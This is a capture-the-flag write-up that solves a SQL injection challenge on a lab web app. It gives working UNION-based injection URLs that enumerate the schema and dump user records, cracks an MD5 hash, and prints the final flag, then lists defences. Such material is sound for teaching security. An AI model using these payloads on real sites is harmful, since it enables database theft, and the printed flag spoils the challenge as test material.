# Flag Documentation: SQL Injection Flag

## Challenge Overview
This challenge involves exploiting a SQL Injection vulnerability in a web application to retrieve sensitive information from the database and uncover a hidden flag.

## Tools Needed
- [MD5 Decrypt](https://md5decrypt.net/)

## Steps to Solve

1. **Test for Vulnerability**:
   - Start by testing if the `id` parameter is vulnerable to SQL Injection. Modify the `id` parameter to:
     ```
     http://10.14.59.254/?page=member&id=1+OR+1=1+--+&Submit=Submit#
     ```
   - If the page behaves differently, it confirms the presence of a SQL Injection vulnerability.

2. **Find Columns**:
   - Next, determine the number of columns in the query using the following payload:
     ```
     http://10.14.59.254/?page=member&id=1+UNION+SELECT+NULL,NULL+--+&Submit=Submit#
     ```
   - Adjust the number of `NULL` values if needed, until the page loads correctly. This will help you find the correct number of columns.

3. **Explore Schema**:
   - Once the columns are identified, explore the database schema to retrieve information about the tables and columns. Use the following query:
     ```
     http://10.14.59.254/?page=member&id=1+UNION+SELECT+table_name,column_name+FROM+information_schema.columns+--+&Submit=Submit#
     ```

4. **Focus on the Users Table**:
   - To narrow down the search, focus on the `users` table and retrieve its column names by using:
     ```
     http://10.14.59.254/?page=member&id=1+UNION+SELECT+table_name,column_name+FROM+information_schema.columns+WHERE+table_name='users'+--+&Submit=Submit#
     ```

5. **Retrieve Data**:
   - Now, use the information from the previous steps to retrieve user data. To extract sensitive data for the user with `user_id=5`, use:
     ```
     http://10.14.59.254/?page=member&id=1+UNION+SELECT+NULL,CONCAT(first_name,last_name,town,country,planet,Commentaire,countersign)+FROM+users+WHERE+user_id=5+--+&Submit=Submit#
     ```

6. **Decrypt the Flag**:
   - You will encounter the following string:
     ```
     FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
     ```
   - The `5ff9d0165b4f92b14994e5c685cdce28` is an MD5 hash. Use [MD5 Decrypt](https://md5decrypt.net/) to decrypt it to get `FortyTwo`.
   - Convert `FortyTwo` to lowercase: `fortytwo`.
   - Finally, encrypt `fortytwo` using SHA256 to get the flag:
     ```
     10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
     ```

## How to Avoid This Breach in a Website

1. **Use Prepared Statements**: Always use prepared statements with parameterized queries to prevent SQL injection vulnerabilities.
2. **Input Validation**: Validate and sanitize all user inputs to ensure that malicious SQL commands are not accepted.
3. **Limit Database Permissions**: Apply the principle of least privilege to database users, ensuring they can only perform the necessary actions.
4. **Use Web Application Firewalls (WAFs)**: Implement a WAF to detect and block SQL injection attempts.
5. **Conduct Regular Security Testing**: Regularly perform security audits, penetration testing, and code reviews to identify and fix potential SQL injection vulnerabilities.
